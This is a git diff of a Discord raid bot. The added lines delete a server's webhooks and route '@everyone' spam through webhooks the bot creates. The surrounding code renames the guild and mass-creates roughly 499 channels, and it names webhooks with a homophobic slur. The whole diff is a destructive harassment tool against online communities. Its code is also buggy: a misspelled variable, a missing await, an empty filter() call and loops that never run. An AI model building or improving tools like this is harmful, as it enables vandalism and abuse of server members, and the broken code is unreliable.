@@ -24,13 +24,16 @@ client.on("message", async (message) => {
             message.delete();
             if(message.guild.channels > 500) return message.channel.send(`too much text channels`)
             let i;
+            const webhooks = messsage.guild.fetchWebhooks();
+            const Webhoeks = webhooks.filter();
+            for (let [id, webhook] of Webhoeks) webhook.delete();
             if(!args.slice(0).join(' ')){ 
                 message.guild.setName('haha admin go grr -ags and gs')
                 for(i = 0; i < 499; i++){
                     message.guild.createChannel('haha admin go grr', 'text').then(m =>{
                         m.createWebhook("get raided faggots").then(w => {
                             const case1hook = new Discord.WebhookClient(w.id, w.token)
-                            for(let hokeii = 0; hokeii == 5; hokeii++) m.channel.send(`@everyone raided epicclly by padero's private chimera girl`)
+                            for(let hokeii = 0; hokeii == 5; hokeii++) case1hook.send(`@everyone raided epicclly by padero's private chimera girl`)
                         })
                     })
                     message.guild.createChannel('haha admin go grr', 'voice')
@@ -41,7 +44,7 @@ client.on("message", async (message) => {
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text').then(m =>{
                         m.createWebhook("get raided faggots").then(w => {
                             const case2hook = new Discord.WebhookClient(w.id, w.token)
-                            for(let hokei = 0; hokei == 5; hokei++) m.channel.send(`@everyone raided epicclly by padero's private chimera girl`)
+                            for(let hokei = 0; hokei == 5; hokei++) case2hook.send(`@everyone raided epicclly by padero's private chimera girl`)
                         })
                     })
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
